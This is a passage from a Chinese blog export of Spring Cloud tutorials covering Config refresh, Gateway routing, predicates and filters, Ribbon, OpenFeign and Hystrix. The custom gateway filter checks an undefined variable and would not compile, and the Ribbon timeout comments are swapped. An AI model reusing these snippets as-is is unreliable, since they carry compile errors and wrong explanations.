修改config-dev.yml配置并提交到GitHub中，比如加个变量age或者版本号version 主启动类: 1234567891011package com.kayleh.springcloud;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@SpringBootApplicationpublic class ConfigClientMain3355 &#123; public static void main(String[] args) &#123; SpringApplication.run( ConfigClientMain3355.class,args); &#125;&#125; 业务类 1234567891011121314151617package com.kayleh.springcloud.Controller;import org.springframework.beans.factory.annotation.Value;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class ConfigClientController &#123; @Value(\"$&#123;config.info&#125;\") private String configInfo; @GetMapping(\"/configInfo\") public String getConfigInfo()&#123; return configInfo; &#125;&#125; 启动Config配置中心3344微服务并自测 12http:&#x2F;&#x2F;config-3344.com:3344&#x2F;master&#x2F;config-dev.ymlhttp:&#x2F;&#x2F;config-3344.com:3344&#x2F;master&#x2F;config-test.yml 启动3355作为Client准备访问 1http:&#x2F;&#x2F;localhost:3355&#x2F;configInfo 成功实现了客户端3355访问SpringCloud Config3344通过GitHub获取配置信息 问题随时而来，分布式配置的动态刷新 Linux运维修改GitHub上的配置文件内容做调整 刷新3344，发现ConfigServer配置中心立刻响应 刷新3355，发现ConfigServer客户端没有任何响应 3355没有变化除非自己重启或者重新加载 难道每次运维修改配置文件，客户端都需要重启？？噩梦 Config客户端之动态刷新避免每次更新配置都要重启客户端微服务3355 修改3355模块 POM引入actuator监控 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 修改YML，暴露监控端口 12345678910111213141516171819202122server: port: 3355spring: application: name: config-client cloud: config: label: master name: config profile: dev uri: http://localhost:3344eureka: client: service-url: defaultZone: http://eureka7001.com:7001/eurekamanagement: endpoints: web: exposure: include: \"*\" @RefreshScope业务类Controller修改 12345678910111213141516171819package com.kayleh.springcloud.Controller;import org.springframework.beans.factory.annotation.Value;import org.springframework.cloud.context.config.annotation.RefreshScope;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RefreshScope@RestControllerpublic class ConfigClientController &#123; @Value(\"$&#123;config.info&#125;\") private String configInfo; @GetMapping(\"/configInfo\") public String getConfigInfo()&#123; return configInfo; &#125;&#125; 此时修改去github 测试3344 和3355 http://config-3344.com:3344/master/config-dev.yml http://localhost:3355/configInfo 3355没有改变，(只有重启才有效果） 需要运维人员发送Post请求刷新3355,必须是Post请求 1curl -X POST &quot;http:&#x2F;&#x2F;localhost:3355&#x2F;actuator&#x2F;refresh&quot; 再次http://localhost:3355/configInfo 成功实现了客户端3355刷新到最新配置内容,避免了服务的重启 想想还有什么问题？ 假如有多个微服务客户端3355/3366/3377。。。。 每个微服务都要执行一次post请求，手动刷新？ 可否广播，一次通知，处处生效？ 我们想大范围的自动刷新，求方法","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"GateWay服务限流","slug":"分布式的微服务架构4","date":"2020-08-14T07:21:47.000Z","updated":"2021-04-11T17:11:28.706Z","comments":true,"path":"gateway-service-current-limit/","link":"","permalink":"https://kayleh.top/gateway-service-current-limit/","excerpt":"GateWay服务限流","text":"GateWay服务限流 秒杀高并发等操作,严禁一窝蜂的过来拥挤,大家排队,一秒钟N个,有序进行.flowlimit GatewayGateway是在Spring生态系统之上构建的API网关服务，基于Spring 5，Spring Boot 2和 Project Reactor等技术。 Gateway旨在提供一种简单而有效的方式来对API进行路由，以及提供一些强大的过滤器功能，例如：熔断、限流、重试等。 SpringCloud Gateway 使用的是Webflux中的reactor-netty响应式编程组件，底层使用了Netty通讯框架。 Gateway： Gateway的三大核心概念Route(路由)路由是构建网关的基本模块，它由ID，目标URI，一系列的断言和过滤器组成，如果断言为true则匹配该路由。 Predicate（断言）参考的是java8的java.util.function.Predicate开发人员可以匹配HTTP请求中的所有内容（例如请求头或请求参数），如果请求与断言相匹配则进行路由 Filter(过滤)指的是Spring框架中GatewayFilter的实例，使用过滤器，可以在请求被路由前或者之后对请求进行修改。 工作流程 核心逻辑 路由转发+执行过滤器链 新建cloud-gateway-gateway9527 pom(移除了web依赖) 123456789101112131415161718192021222324252627282930313233343536&lt;dependencies&gt; &lt;!--新增gateway--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;/dependencies&gt; yml 12345678910111213server: port: 9527spring: application: name: cloud-gatewayeureka: instance: hostname: cloud-gateway-service client: service-url: register-with-eureka: true fetch-registry: true defaultZone: http://eureka7001.com:7001/eureka 无业务类 主启动类 12345678package com.kayleh.springcloud;@SpringBootApplication@EnableEurekaClientpublic class GateWayMain9527 &#123; public static void main(String[] args) &#123; SpringApplication.run(GateWayMain9527.class, args); &#125;&#125; 观察cloud-provider-payment8001的controller的get/lb访问路径 目前不想暴露8001端口，希望在8001外面套一层9527 修改pom.xml 123456789101112131415161718192021222324252627server: port: 9527spring: application: name: cloud-gateway cloud: gateway: routes: - id: payment_routh #路由的ID，没有固定规则但要求唯一，建议配合服务名 uri: http://localhost:8001 #匹配后提供服务的路由地址 predicates: - Path=/payment/get/** #断言,路径相匹配的进行路由 - id: payment_routh2 uri: http://localhost:8001 predicates: - Path=/payment/lb/** #断言,路径相匹配的进行路由eureka: instance: hostname: cloud-gateway-service client: #服务提供者注册进eureka服务列表内 service-url: register-with-eureka: true fetch-registry: true defaultZone: http://eureka7001.com:7001/eureka 测试 添加网关前 1http:&#x2F;&#x2F;localhost:8001&#x2F;payment&#x2F;get&#x2F;31 添加网关后 1http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;get&#x2F;31 除了使用yaml的方法配置还可以使用代码配置：9527 12345678910111213package com.kayleh.springcloud.config;@Configurationpublic class GateWayConfig &#123; @Bean public RouteLocator customRouteLocator(RouteLocatorBuilder routeLocatorBuilder) &#123; RouteLocatorBuilder.Builder routes = routeLocatorBuilder.routes(); routes.route(\"path_rote_kayleh\", r -&gt; r.path(\"/guonei\") .uri(\"http://news.baidu.com/guonei\")).build(); return routes.build(); &#125;&#125; 测试 1http:&#x2F;&#x2F;localhost:9527&#x2F;guonei 通过微服务名实现动态路由默认情况下Gateway会根据注册中心的服务列表，以注册中心上微服务名为路径创建动态路由进行转发，从而实现动态路由的功能 修改yaml 12345678910111213141516171819202122232425262728293031server: port: 9527spring: application: name: cloud-gateway cloud: gateway: discovery: locator: enabled: true #开启从注册中心动态创建路由的功能，利用微服务名进行路由 routes: - id: payment_routh #路由的ID，没有固定规则但要求唯一，建议配合服务名 #uri: http://localhost:8001 #匹配后提供服务的路由地址 uri: lb://cloud-payment-service predicates: - Path=/payment/get/** #断言,路径相匹配的进行路由 - id: payment_routh2 #uri: http://localhost:8001 #匹配后提供服务的路由地址 uri: lb://cloud-payment-service predicates: - Path=/payment/lb/** #断言,路径相匹配的进行路由eureka: instance: hostname: cloud-gateway-service client: service-url: register-with-eureka: true fetch-registry: true defaultZone: http://eureka7001.com:7001/eureka 需要注意的是uri的协议为lb，表示启用Gateway的负载均衡功能。 lb://serviceName是spring cloud gateway在微服务中自动为我们创建的负载均衡uri 测试 1http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lb 8001/8002两个端口切换 Predicate的使用 常用的Route PredicateAfter Route Predicate12- After=2020-03-08T10:59:34.102+08:00[Asia/Shanghai]# 在？？？时间后生效 时间可以这样获取： 12ZonedDateTime zbj = ZonedDateTime.now();System.out.println(zbj); Before Route Predicate12- After=2020-03-08T10:59:34.102+08:00[Asia/Shanghai]- Before=2020-03-08T10:59:34.102+08:00[Asia/Shanghai] Between Route Predicate1- Between&#x3D;2020-03-08T10:59:34.102+08:00[Asia&#x2F;Shanghai] , 2020-03-08T10:59:34.102+08:00[Asia&#x2F;Shanghai] Cookie Route Predicate 1- Cookie=username,kayleh #并且Cookie是username=kayleh才能访问 不带cookies访问 12345-&gt; cmdcurl http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lbcurl http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lb --cookie &quot;username,kayleh&quot; #返回端口号表示访问成功 带上cookies访问 加入curl返回中文乱码 https://blog.csdn.net/leedee/article/details/82685636 Header Route Predicate1- Header=X-Request-Id, \\d+ #请求头中要有X-Request-Id属性并且值为整数的正则表达式 Host Route Predicate1- Host&#x3D;**.atguigu.com Method Route Predicate1- Method&#x3D;GET Path Route PredicateQuery Route Predicate1- Query&#x3D;username, \\d+ #要有参数名称并且是正整数才能路由 测试 12curl http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lb?username&#x3D;1curl http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lb?username&#x3D;-1 ALL 1234567891011121314151617181920212223242526272829303132333435363738server: port: 9527spring: application: name: cloud-gateway cloud: gateway: discovery: locator: enabled: true #开启从注册中心动态创建路由的功能，利用微服务名进行路由 routes: - id: payment_routh #路由的ID，没有固定规则但要求唯一，建议配合服务名 #uri: http://localhost:8001 #匹配后提供服务的路由地址 uri: lb://cloud-payment-service predicates: - Path=/payment/get/** #断言,路径相匹配的进行路由 - id: payment_routh2 #uri: http://localhost:8001 #匹配后提供服务的路由地址 uri: lb://cloud-payment-service predicates: - Path=/payment/lb/** #断言,路径相匹配的进行路由 #- After=2020-03-08T10:59:34.102+08:00[Asia/Shanghai] #- Cookie=username,zhangshuai #并且Cookie是username=zhangshuai才能访问 #- Header=X-Request-Id, \\d+ #请求头中要有X-Request-Id属性并且值为整数的正则表达式 #- Host=**.atguigu.com #- Method=GET #- Query=username, \\d+ #要有参数名称并且是正整数才能路由 eureka: instance: hostname: cloud-gateway-service client: service-url: register-with-eureka: true fetch-registry: true defaultZone: http://eureka7001.com:7001/eureka 说白了，Predicate就是为了实现一组匹配规则， 让请求过来找到对应的Route进行处理 Filter是什么？ 生命周期pre 在业务逻辑之前 post 在业务逻辑之后 种类GatewayFilter 单一 GlobalFilter 全局 常用的GatewayFilterAddRequestParameter yml： 自定义过滤器自定义全局GlobalFilter两个主要接口介绍impiemerts GlobalFilter ，Ordered 能干嘛全局日志记录 统一网关鉴权 。。。 案例： 1234567891011121314151617181920212223242526272829303132333435package com.kayleh.springcloud.filter;import lombok.extern.slf4j.Slf4j;import org.springframework.cloud.gateway.filter.GatewayFilterChain;import org.springframework.cloud.gateway.filter.GlobalFilter;import org.springframework.core.Ordered;import org.springframework.http.HttpStatus;import org.springframework.stereotype.Component;import org.springframework.util.StringUtils;import org.springframework.web.server.ServerWebExchange;import reactor.core.publisher.Mono;import java.util.Date;@Component@Slf4jpublic class MyLogGateWayFilter implements GlobalFilter,Ordered &#123; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123; log.info(\"*********come in MyLogGateWayFilter: \"+new Date()); String uname = exchange.getRequest().getQueryParams().getFirst(\"username\"); if(StringUtils.isEmpty(username))&#123; log.info(\"*****用户名为Null 非法用户,(┬＿┬)\"); exchange.getResponse().setStatusCode(HttpStatus.NOT_ACCEPTABLE);//给人家一个回应 return exchange.getResponse().setComplete(); &#125; return chain.filter(exchange); &#125; @Override public int getOrder() &#123; return 0; &#125;&#125; 启动： 测试： 12正确：http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lb?uname&#x3D;z3错误 http:&#x2F;&#x2F;localhost:9527&#x2F;payment&#x2F;lb","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"Ribbon负载均衡服务调用、服务降级","slug":"分布式的微服务架构3","date":"2020-08-14T07:14:13.000Z","updated":"2021-04-11T17:11:28.690Z","comments":true,"path":"ribbon-load-balancing-service-call-degradation/","link":"","permalink":"https://kayleh.top/ribbon-load-balancing-service-call-degradation/","excerpt":"Ribbon负载均衡服务调用、服务降级","text":"Ribbon负载均衡服务调用、服务降级 LB(负载均衡) 集中式LB即在服务的消费方和提供方之间使用独立的LB设施(可以是硬件,如F5,也可以是软件,如nginx),由该设施负责把访问请求通过某种策略转发至服务的提供方. 进程内LB将逻辑集成到消费方,消费方从服务注册中心获知有哪些地址可用,然后自己再从这些地址中选择出一个合适的服务器. Ribbon就属于进程内LB,它只是一个类库,集成于消费方进程,消费方通过它来获取服务提供方的地址. 就是 负载均衡+RestTemplate调用. 负载均衡演示Ribbon其实就是一个软负载均衡的客户端组件,他可以和其他所需请求的客户端结合使用,和eureka结合只是其中的一个实例. 架构: Ribbon工作时分成两步 第一步先选择EurekaServer,它优先选择在同一区域内负载较少的server 第二步再根据用户指定的策略,在从server取到的服务注册列表中选择一个地址. 其中Ribbon提供了多种策略:比如轮询,随机和根据响应时间加权. 新版的eureka整合了Ribbon 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-ribbon&lt;/artifactId&gt;&lt;/dependency&gt; RestTemplate getForObject和getForEntity: 12345678910111213141516@GetMapping(\"/consumer/payment/get/&#123;id&#125;\") public CommonResult&lt;Payment&gt; getPayment(@PathVariable(\"id\") Long id) &#123; return restTemplate.getForObject(PAYMENT_URL + \"/payment/get/\" + id, CommonResult.class); &#125; @GetMapping(\"/consumer/payment/getForEntity/&#123;id&#125;\") public CommonResult&lt;Payment&gt; getPayment2(@PathVariable(\"id\") Long id) &#123; ResponseEntity&lt;CommonResult&gt; entity = restTemplate.getForEntity(PAYMENT_URL + \"/payment/get/\" + id, CommonResult.class); if (entity.getStatusCode().is2xxSuccessful()) &#123; log.info(entity.getStatusCode()+\"\\t\"+entity.getHeaders()); return entity.getBody(); &#125; else &#123; return new CommonResult&lt;&gt;(444,\"操作失败\"); &#125; &#125; IRule：根据特定算法中从服务列表中选取一个要访问的服务 修改cloyud-consumer-order80 @SpringBootApplication里有@ComponentScan注解,不能和主启动类放在同一包下 新建package com.kayleh.myrule 新建MySelfRule 123456789101112131415161718package com.kayleh.myrule;import com.netflix.loadbalancer.IRule;import com.netflix.loadbalancer.RandomRule;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;/** * @Author: Wizard * @Date: 2020/8/7 14:33 */@Configurationpublic class MySelfRule &#123; @Bean public IRule myRule() &#123; return new RandomRule();//定义为随机 &#125;&#125; 主启动类添加@RibbonClient 12345678@SpringBootApplication@EnableEurekaClient@RibbonClient(name = \"CLOUD-PAYMENT-SERVICE\", configuration = MySelfRule.class)public class OrderMain80 &#123; public static void main(String[] args) &#123; SpringApplication.run(OrderMain80.class, args); &#125;&#125; 测试 1http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;get&#x2F;1 Ribbon负载均衡算法 Ribbon手写轮询算法 OpenFeignFeign是一个声明式WebService客户端。使用Feign能让编写Web Service客户端更加简单。 它的使用方法是定义一个服务接口然后在上面添加注解。Feign也支持可拔插式的编码器和解码器。Spring Cloud对Feign进行了封装，使其支持了Spring MVC标准注解和HttpMessageConverters。Feign可以与Eureka和Ribbon组合使用以支持负载均衡。 feign和OpenFeign OpenFeign服务调用接口+注解新建cloud-consumer-feign-order80 pom.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;dependencies&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--eureka-client--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--引入自己定义的api通用包，可以使用Payment支付Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml 12345678server: port: 80eureka: client: register-with-eureka: false service-url: defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ 主启动类： 12345678910111213package com.kayleh.springcloud;/** * @Author: Wizard * @Date: 2020/8/4 11:20 */@SpringBootApplication@EnableFeignClientspublic class OrderFeignMain80 &#123; public static void main(String[] args) &#123; SpringApplication.run(OrderFeignMain80.class, args); &#125;&#125; Service: 12345678910package com.kayleh.springcloud.service;@Component@FeignClient(\"CLOUD-PAYMENT-SERVICE\")public interface PaymentFeignService &#123; @GetMapping(value = \"/payment/get/&#123;id&#125;\") public CommonResult&lt;Payment&gt; getPaymentById(@PathVariable(\"id\") Long id);&#125; Controller 123456789101112131415package com.kayleh.springcloud.controller;@RestController@Slf4jpublic class OrderFeignController &#123; @Resource private PaymentFeignService paymentFeignService; @GetMapping(value = \"/consumer/payment/get/&#123;id&#125;\") public CommonResult&lt;Payment&gt; getPaymentById(@PathVariable(\"id\") Long id) &#123; return paymentFeignService.getPaymentById(id); &#125;&#125; 测试 1http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;get&#x2F;1 OpenFeign超时控制修改cloud-provider-payment8001的controller，添加 12345678910@GetMapping(value &#x3D; &quot;&#x2F;payment&#x2F;feign&#x2F;timeout&quot;) public String getPaymentFeignTimeout() &#123; &#x2F;&#x2F;暂停几秒钟线程 try &#123; TimeUnit.SECONDS.sleep(3); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; return serverPort; &#125; cloud-consumer-feign-order80的PaymentFeignService接口： 12345678910@Component@FeignClient(\"CLOUD-PAYMENT-SERVICE\")public interface PaymentFeignService &#123; @GetMapping(value = \"/payment/get/&#123;id&#125;\") public CommonResult&lt;Payment&gt; getPaymentById(@PathVariable(\"id\") Long id); @GetMapping(value = \"/payment/feign/timeout\") public String getPaymentFeignTimeout();&#125; cloud-consumer-feign-order80的OrderFeignController，添加： 12345@GetMapping(value = \"/consumer/payment/feign/timeout\") public String getPaymentFeignTimeout() &#123; //客户端默认等待1秒钟 return paymentFeignService.getPaymentFeignTimeout(); &#125; 访问 12http://localhost:8001/payment/feign/timeouthttp://localhost/consumer/payment/feign/timeout #报错 OpenFeign默认支持Ribbon OpenFeign默认等待1秒钟，超过后报错 默认Feign客户端只等待1秒钟,但是服务端处理需要等待超过1秒钟,导致Feign客户端不想等待了,直接返回报错. 为了避免这样的情况,有时候我们需要设置Feign客户端的超时控制. yml文件中开启配置 修改cloud-consumer-feign-order80的yaml 123456789101112131415server: port: 80eureka: client: register-with-eureka: false service-url: defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/#设置feign客户端超时时间(OpenFeign默认支持Ribbon)ribbon: #指的是建立连接所用的时间,使用于网络状况正常的情况下,两端连接所用的时间 ReadTimeout: 5000 #指的是建立连接后从服务端读取到可用资源所用的时间 ConnectTimeout: 5000 再测试 1http:&#x2F;&#x2F;localhost&#x2F;consumer&#x2F;payment&#x2F;feign&#x2F;timeout OpenFeign日志打印功能Feign提供了日志打印功能，我们可以通过配置来调整日志级别，从而了解Feign中Http请求的细节。说白了就是对Feign接口的调用情况进行监控和输出 在cloud-consumer-feign-order80的FeignConfig中添加 12345678910111213141516171819package com.kayleh.springcloud.config;import feign.Logger;import org.springframework.cloud.client.loadbalancer.LoadBalanced;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.client.RestTemplate;/** * @Author: Wizard * @Date: 2020/8/4 12:54 */@Configurationpublic class FeignConfig &#123; @Bean Logger.Level feignLoggerLevel() &#123; return Logger.Level.FULL; &#125;&#125; 修改yaml文件 12345678910111213141516171819server: port: 80eureka: client: register-with-eureka: false service-url: defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/#设置feign客户端超时时间(OpenFeign默认支持Ribbon)ribbon: #指的是建立连接所用的时间,使用于网络状况正常的情况下,两端连接所用的时间 ReadTimeout: 5000 #指的是建立连接后从服务端读取到可用资源所用的时间 ConnectTimeout: 5000logging: level: # feign以什么级别监控哪个接口 com.kayleh.springcloud.service.PaymentFeignService: debug 即可开启日志功能。 Hystrix服务调用 案例:新建cloud-provider-hystrix-payment8001 pom.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- eureka-client--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--引入自己定义的api通用包，可以使用Payment支付Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 热部署--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml 1234567891011121314server: port: 8001spring: application: name: cloud-provider-hystrix-paymenteureka: client: register-with-eureka: true fetch-registry: true service-url: # defaultZone: http://localhost:7001/eureka/ defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ service 12345678910111213141516171819202122package com.kayleh.springcloud.service;import com.kayleh.springcloud.entities.Payment;import org.apache.ibatis.annotations.Param;import org.springframework.stereotype.Service;import java.util.concurrent.TimeUnit;@Servicepublic class PaymentService &#123; public String paymentInfo_OK(Integer id) &#123; return \"线程池: \" + Thread.currentThread().getName() + \" paymentInfo_OK,id: \" + id + \"\\t\" + \"O(∩_∩)O哈哈~\"; &#125; public String paymentInfo_TimeOut(Integer id) &#123; //暂停3秒钟 int timeNumber = 3; try &#123; TimeUnit.SECONDS.sleep(timeNumber); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; return \"线程池: \" + Thread.currentThread().getName() + \" paymentInfo_TimeOut,id: \" + id + \"\\t\" + \"o(╥﹏╥)o哭\" + \"耗时\" + timeNumber + \"秒钟\"; &#125;&#125; controller 123456789101112131415161718192021222324@RestController@Slf4jpublic class PaymentController &#123; @Resource private PaymentService paymentService; @Value(\"$&#123;server.port&#125;\") private String serverPort; @PostMapping(value = \"/payment/hystrix/ok/&#123;id&#125;\") public String paymentInfo_OK(@PathVariable(\"id\") Integer id) &#123; String result = paymentService.paymentInfo_OK(id); log.info(\"----------result:\" + result); return result; &#125; @GetMapping(value = \"/payment/hystrix/timeout/&#123;id&#125;\") public String paymentInfo_TimeOut(@PathVariable(\"id\") Integer id) &#123; String result = paymentService.paymentInfo_TimeOut(id); log.info(\"----------result:\" + result); return result; &#125;&#125; 测试 12localhost:8001&#x2F;payment&#x2F;hystrix&#x2F;ok&#x2F;&#123;id&#125;localhost:8001&#x2F;payment&#x2F;hystrix&#x2F;timeout&#x2F;&#123;id&#125; 以上述为根基平台，从正确 —&gt;错误 —&gt; 降级熔断 —&gt; 恢复 Jmeter压测测试开启 Jmeter，来20000个并发压死8001，20000个请求都去访问paymentInfo_TimeOut http://localhost:8001/payment/hystrix/timeout/1 这时访问 1http:&#x2F;&#x2F;localhost:8001&#x2F;payment&#x2F;hystrix&#x2F;ok&#x2F;1 访问开始变慢了 这只是服务提供者8001自己测试，假如此时外部的消费者80也来访问，那消费者只能干等，最终导致消费端80不满意，服务端8001直接被拖死。 新建cloud-consumer-feign-hystrix-order80 pom.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;dependencies&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- eureka-client--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--引入自己定义的api通用包，可以使用Payment支付Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; 